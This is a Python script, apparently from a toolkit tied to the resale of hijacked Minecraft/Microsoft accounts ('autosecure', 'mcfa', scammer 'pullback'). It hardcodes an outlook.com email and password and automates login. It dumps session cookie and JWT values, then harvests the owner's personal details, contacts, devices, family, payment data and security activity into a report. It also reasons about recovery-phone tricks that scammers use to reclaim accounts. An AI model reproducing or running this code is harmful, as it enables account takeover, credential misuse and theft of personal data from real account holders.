#!/usr/bin/env python3
"""Deep pre-freakyward remnant probe on mcfa survivor account.

Assumption (user-corrected): freakyward.cyou = prior autosecure provider.
We hunt what the ORIGINAL scammer left that survived freakyward's secure
(and ours) — especially ghost phone / ACSR / FIDO / activity history.
"""
from __future__ import annotations

import asyncio
import base64
import json
import re
import sys
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import unquote

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from securing.auth.handle_redirects import get_data, handle_redirects
from securing.auth.initial_session import get_session
from securing.auth.polish_host import polish_host
from securing.autobuy_hold_check import fetch_credential_type
from securing.utils.cookies.get_amc import get_amc
from securing.utils.cookies.get_livedata import livedata
from securing.utils.cookies.safe_cookies import has_cookie
from securing.utils.login_pwd import login_pwd
from securing.utils.ogi.amc_headers import amc_api_headers
from securing.utils.ogi.get_contacts import get_contacts
from securing.utils.ogi.get_devices import get_devices
from securing.utils.ogi.get_family import get_family
from securing.utils.ogi.get_owner_info import get_owner_info
from securing.utils.proxy import close_session

EMAIL = "mcfa.uhtn6av7@outlook.com"
PWD = "FjU3K9ZG7LuxCg"
OUT = Path(__file__).resolve().parents[1] / "forensics" / "mcfa_pre_freakyward.json"


def b64url_json(segment: str):
    pad = "=" * (-len(segment) % 4)
    try:
        return json.loads(base64.urlsafe_b64decode(segment + pad))
    except Exception:
        return None


def ticks_to_iso(ticks) -> str | None:
    """Convert .NET DateTime ticks or FILETIME-ish values to ISO if plausible."""
    try:
        t = int(ticks)
    except Exception:
        return None
    # .NET ticks since 0001-01-01
    if t > 600_000_000_000_000_000:  # ~year 1900+
        try:
            # days from year 1
            seconds = t / 10_000_000
            # datetime doesn't support year 1 easily; use epoch offset
            # .NET ticks at Unix epoch (1970-01-01) = 621355968000000000
            unix = (t - 621355968000000000) / 10_000_000
            if unix < 0 or unix > 2e9:
                return None
            return datetime.fromtimestamp(unix, tz=timezone.utc).isoformat()
        except Exception:
            return None
    return None


async def amc_get(session, url, token, qos):
    h = amc_api_headers(session, token, qos_root=qos)
    r = await session.get(url, headers=h, follow_redirects=True)
    try:
        body = r.json()
    except Exception:
        body = (r.text or "")[:3000]
    return {"status": r.status_code, "url": str(r.url), "body": body}


async def main():
    report = {
        "target": EMAIL,
        "assumption": "freakyward.cyou was prior autosecure provider; hunt pre-provider scammer remnants",
        "findings": [],
    }

    print("=== GCT baseline ===")
    gct = await fetch_credential_type(EMAIL)
    creds = (gct or {}).get("Credentials") or {}
    report["gct"] = {
        "HasPhone": creds.get("HasPhone"),
        "HasFido": creds.get("HasFido"),
        "HasRemoteNGC": creds.get("HasRemoteNGC"),
        "HasPassword": creds.get("HasPassword"),
        "PrefCredential": creds.get("PrefCredential"),
        "OtcLoginEligibleProofs": creds.get("OtcLoginEligibleProofs"),
        "raw_credentials": creds,
    }
    print(json.dumps(report["gct"], indent=2, default=str)[:2000])

    session = get_session()
    try:
        live = await livedata(session)
        page = await login_pwd(session, EMAIL, live["urlPost"], PWD, live["ppft"])
        msa = get_data(page)
        if not msa:
            h = await handle_redirects(session, page)
            if isinstance(h, dict):
                msa = h
            elif isinstance(h, str):
                msa = get_data(h)
                page = h
        report["login"] = {
            "passkey_interrupt": "interrupt/passkey" in (page or ""),
            "identity_confirm": "identity/confirm" in (page or ""),
            "snippet": (page or "")[:500],
        }
        if not msa or not msa.get("urlPost"):
            if has_cookie(session, "__Host-MSAAUTH") or has_cookie(session, "MSPAuth"):
                msa = {"_cookies_only": True}
            else:
                print("LOGIN FAIL")
                OUT.write_text(json.dumps(report, indent=2, default=str))
                return
        await polish_host(session, msa)

        # Cookie / token forensics
        cookie_rows = []
        for c in session.cookies.jar:
            row = {
                "name": c.name,
                "domain": c.domain,
                "value_len": len(c.value or ""),
                "prefix": (c.value or "")[:32],
            }
            if c.name in ("AMCSecAuthJWT", "client_info", "MSPCID", "MSPPre", "ANON", "NAP"):
                row["value"] = c.value
            if c.name == "AMCSecAuthJWT" and c.value:
                parts = c.value.split(".")
                if len(parts) >= 2:
                    row["jwt_payload"] = b64url_json(parts[1])
            cookie_rows.append(row)
        report["cookies"] = cookie_rows

        # Finish AMC properly
        try:
            tokens = await get_amc(session)
        except Exception as exc:
            tokens = {}
            report["amc_error"] = repr(exc)
        report["amc_tokens_present"] = {k: bool(v) for k, v in (tokens or {}).items()}

        home = (tokens or {}).get("home")
        profile = (tokens or {}).get("profile")
        devices_tok = (tokens or {}).get("devices")

        owner = await get_owner_info(session, profile or home)
        contacts = await get_contacts(session, profile or home)
        devices = await get_devices(session, devices_tok or home)
        family = await get_family(session, home)

        report["owner"] = owner
        report["contacts"] = contacts
        report["devices"] = devices
        report["family"] = family
        print("OWNER:", json.dumps(owner, default=str)[:1500])
        print("CONTACTS:", json.dumps(contacts, default=str)[:2000])
        print("DEVICES:", json.dumps(devices, default=str)[:1000])
        print("FAMILY:", json.dumps(family, default=str)[:1000])

        # Timestamp archaeology from contacts permissionsUrlParams.D
        try:
            for email_obj in (contacts or {}).get("emails") or []:
                params = (email_obj or {}).get("permissionsUrlParams") or {}
                if params.get("D"):
                    report["findings"].append(
                        {
                            "type": "email_permission_timestamp",
                            "email": email_obj.get("address") or email_obj.get("email"),
                            "D_raw": params.get("D"),
                            "D_iso": ticks_to_iso(params.get("D")),
                            "params": params,
                        }
                    )
        except Exception:
            pass

        # Security / activity HTML pages (APIs 404'd earlier)
        pages = {}
        for label, url in (
            ("security", "https://account.microsoft.com/security"),
            ("security_proofs", "https://account.microsoft.com/security#proofs"),
            (
                "recent_activity",
                "https://account.live.com/ActivityHistory.aspx?mkt=en-US",
            ),
            (
                "recent_activity2",
                "https://account.microsoft.com/account-security/recent-activity",
            ),
            (
                "unusual",
                "https://account.live.com/ActivityHistory.aspx?view=1",
            ),
            ("devices_page", "https://account.microsoft.com/devices"),
            (
                "privacy_activity",
                "https://account.microsoft.com/privacy/activity-history",
            ),
            (
                "app_access",
                "https://account.microsoft.com/privacy/app-access",
            ),
            (
                "outlook_options",
                "https://outlook.live.com/mail/0/options/mail/forwarding",
            ),
            (
                "outlook_rules",
                "https://outlook.live.com/owa/?path=/options/inboxrules",
            ),
            (
                "skype_profile",
                "https://account.live.com/proofs/manage/additional?mkt=en-US",
            ),
        ):
            r = await session.get(url, follow_redirects=True)
            text = r.text or ""
            # Pull activity-like JSON blobs / phone / sms mentions
            phones = re.findall(
                r"(?:\+?\d[\d\-\s()]{7,}\d)|(?:\*{2,}\d{2,4})", text
            )
            activity_hints = re.findall(
                r"(security (?:info|code|email|phone)|phone number|text message|authenticator|passkey|Windows Hello|recovery code|two-step|unusual|signed in|password (?:changed|reset)|proof (?:added|removed))",
                text,
                re.I,
            )
            pages[label] = {
                "status": r.status_code,
                "final": str(r.url),
                "len": len(text),
                "title": (
                    re.search(r"<title[^>]*>(.*?)</title>", text, re.I | re.S) or [None, ""]
                )[1][:120],
                "phone_like": phones[:30],
                "activity_hints": list({h.lower() for h in activity_hints})[:40],
                "snippet": text[:2000],
            }
            print(
                f"PAGE {label}: status={r.status_code} title={pages[label]['title']!r} "
                f"phones={phones[:5]} hints={pages[label]['activity_hints'][:8]}"
            )
        report["pages"] = pages

        # AMC alternate security endpoints
        alt = {}
        for name, url, qos in (
            (
                "security_info",
                "https://account.microsoft.com/security/api/security-info",
                "GLOBAL.SECURITY.GETSECURITYINFO",
            ),
            (
                "proofs",
                "https://account.microsoft.com/security/api/proofs",
                "GLOBAL.SECURITY.GETPROOFS",
            ),
            (
                "activity",
                "https://account.microsoft.com/security/api/activity",
                "GLOBAL.SECURITY.GETACTIVITY",
            ),
            (
                "notifications",
                "https://account.microsoft.com/security/api/notifications",
                "GLOBAL.SECURITY.GETNOTIFICATIONS",
            ),
            (
                "trusted_devices",
                "https://account.microsoft.com/security/api/trusted-devices",
                "GLOBAL.SECURITY.GETTRUSTEDDEVICES",
            ),
            (
                "user_info",
                "https://account.microsoft.com/home/api/user-info",
                "GLOBAL.HOME.GETUSERINFO",
            ),
            (
                "payment",
                "https://account.microsoft.com/billing/api/payments",
                "GLOBAL.BILLING.GETPAYMENTS",
            ),
        ):
            alt[name] = await amc_get(session, url, home or profile, qos)
            print(f"API {name}: status={alt[name]['status']} body={str(alt[name]['body'])[:200]}")
        report["amc_alt"] = alt

        # Xbox / Minecraft identity remnant
        xbox = {}
        for name, url in (
            (
                "profile_settings",
                "https://account.microsoft.com/profile/api/v1/personal-info",
            ),
            (
                "xbox_auth",
                "https://sisu.xboxlive.com/connect/XboxLive/?state=login&display=hostos&redirect_uri=https%3A%2F%2Fwww.xbox.com%2Fauth%2Fmsa",
            ),
            (
                "minecraft_profile",
                "https://www.minecraft.net/msal/callback",
            ),
        ):
            r = await session.get(url, follow_redirects=True)
            xbox[name] = {
                "status": r.status_code,
                "final": str(r.url),
                "len": len(r.text or ""),
                "snippet": (r.text or "")[:800],
            }
        report["xboxish"] = xbox

        # Live.com ServerData identifiers from proofs manage (NetId etc.)
        r = await session.get(
            "https://account.live.com/", follow_redirects=True
        )
        html = r.text or ""
        ids = {}
        for key in (
            "sEncryptedNetId",
            "sNetId",
            "sPUID",
            "sCID",
            "sSigninName",
            "sUserEmail",
            "sPrimaryEmail",
            "iPassportFlags",
            "fHasPhone",
            "fHasSkype",
            "fHasAuthenticator",
            "fIsTfaEnabled",
        ):
            m = re.search(rf'"{key}"\s*:\s*"((?:\\.|[^"\\])*)"', html)
            if m:
                try:
                    ids[key] = json.loads(f'"{m.group(1)}"')
                except Exception:
                    ids[key] = m.group(1)
            else:
                m = re.search(rf'"{key}"\s*:\s*(true|false|\d+)', html)
                if m:
                    raw = m.group(1)
                    ids[key] = (
                        True
                        if raw == "true"
                        else False
                        if raw == "false"
                        else int(raw)
                    )
        report["live_home_ids"] = ids
        print("LIVE IDS:", ids)

        # Verdict assembly
        has_phone = report["gct"].get("HasPhone")
        msa_phones = (contacts or {}).get("msaPhones") if isinstance(contacts, dict) else None
        mmx_phones = (contacts or {}).get("mmxPhones") if isinstance(contacts, dict) else None
        visible_phones_empty = (msa_phones == [] or msa_phones is None) and (
            mmx_phones == [] or mmx_phones is None
        )

        if has_phone == 1 and visible_phones_empty:
            report["findings"].append(
                {
                    "confidence": 0.95,
                    "type": "ghost_HasPhone_survived_provider_secure",
                    "detail": (
                        "HasPhone=1 with empty msaPhones/mmxPhones and no smsProofs. "
                        "This flag commonly survives DeleteProof of SMS and provider "
                        "RecoverUser. Enables ACSR / phone-channel recovery — classic "
                        "pre-autosecure scammer plant for mass pullback."
                    ),
                }
            )

        if report["gct"].get("HasFido") in (1, True):
            report["findings"].append(
                {
                    "confidence": 0.85,
                    "type": "active_FIDO",
                    "detail": "HasFido still set — passkey may survive password/RC resets if not revoked.",
                }
            )
        else:
            report["findings"].append(
                {
                    "confidence": 0.7,
                    "type": "FIDO_cleared_or_never_stored",
                    "detail": (
                        "HasFido=0 now. Earlier passkey interrupt was likely MS "
                        "enrollment nag after RecoverUser, not proof of stored FIDO. "
                        "RevokeWindowsHello returned 6001 during our wipe (false success)."
                    ),
                }
            )

        report["conclusion"] = {
            "pre_freakyward_culprit": "ghost phone / HasPhone ACSR channel (most likely)",
            "freakyward_role": "prior autosecure provider — their email was the post-secure OTC proof, not the scammer",
            "why_mass_pullback": (
                "Scammer links phone (or triggers HasPhone) before selling/securing. "
                "Provider RecoverUser rotates password/RC/security-email but HasPhone "
                "stays 1 with no visible SMS proof. Scammer later reclaims via ACSR/"
                "phone recovery across the batch. This account survived — flag still "
                "present but may not have been exploited yet, or phone was lost/burned."
            ),
            "what_we_cannot_see": (
                "Microsoft does not expose deleted-proof history via consumer APIs; "
                "cannot recover the exact phone number or timestamp of SMS add before freakyward."
            ),
        }

    finally:
        await close_session(session)

    OUT.parent.mkdir(parents=True, exist_ok=True)
    OUT.write_text(json.dumps(report, indent=2, default=str))
    print("\nWrote", OUT)
    print("\nCONCLUSION:", json.dumps(report.get("conclusion"), indent=2))
    print("FINDINGS:", json.dumps(report.get("findings"), indent=2, default=str)[:2000])


if __name__ == "__main__":
    asyncio.run(main())
